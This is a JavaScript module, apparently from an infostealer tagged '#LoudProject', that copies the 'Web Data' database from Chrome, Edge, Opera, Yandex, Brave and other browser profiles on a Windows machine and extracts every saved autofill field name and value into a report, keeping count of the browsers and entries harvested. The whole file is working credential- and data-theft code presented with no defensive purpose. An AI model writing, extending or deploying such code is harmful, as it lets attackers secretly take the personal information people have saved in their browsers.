const fs = require("fs");
let { state } = require("../../data/data");
const appdata = process.env.LOCALAPPDATA || "";
const sqlite3 = require("sqlite3");

async function GetAutofills(path) {
  const path_split = path.split("\\");
  const path_split_tail = path.includes("\\Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
  let path_tail = path_split_tail.join("\\") + "\\";

  if (path.startsWith(appdata)) path_tail = path;
  if (path.includes("cord")) return;
  if (!fs.existsSync(path_tail)) return;

  const login_data = path + "Web Data";
  const autofilldata_db = path + "autofilldata.db";

  fs.copyFileSync(login_data, autofilldata_db);

  if (autofilldata_db.includes("Chrome") && !state.autofilldataBrowserUsed.has("Chrome")) {
    state.autofilldataBrowserUsed.add("Chrome");
  } else if (autofilldata_db.includes("Firefox") && !state.autofilldataBrowserUsed.has("Firefox")) {
    state.autofilldataBrowserUsed.add("Firefox");
  } else if (autofilldata_db.includes("Edge") && !state.autofilldataBrowserUsed.has("Edge")) {
    state.autofilldataBrowserUsed.add("Edge");
  } else if (autofilldata_db.includes("Opera") && !state.autofilldataBrowserUsed.has("Opera")) {
    state.autofilldataBrowserUsed.add("Opera");
  } else if (autofilldata_db.includes("Firefox") && !state.autofilldataBrowserUsed.has("Firefox")) {
    state.autofilldataBrowserUsed.add("Firefox");
  } else if (autofilldata_db.includes("Yandex") && !state.autofilldataBrowserUsed.has("Yandex")) {
    state.autofilldataBrowserUsed.add("Yandex");
  } else if (autofilldata_db.includes("Brave") && !state.autofilldataBrowserUsed.has("Brave")) {
    state.autofilldataBrowserUsed.add("Brave");
  }

  let result = `\n\nAUTO FILL DATA FROM: ${path} #LoudProject`;

  const sql = new sqlite3.Database(autofilldata_db, (err) => {
    if (err) {
    }
  });

  const autofill = await new Promise((resolve) => {
    sql.each(
      "SELECT * FROM autofill",
      function (err, row) {
        if (err) return;

        result += "\nNAME: " + row["name"] + " | DATA: " + row["value"];
        state.autofillCount.value++;
      },
      function () {
        resolve(result);
      }
    );
  });

  return autofill;
}

module.exports = GetAutofills;
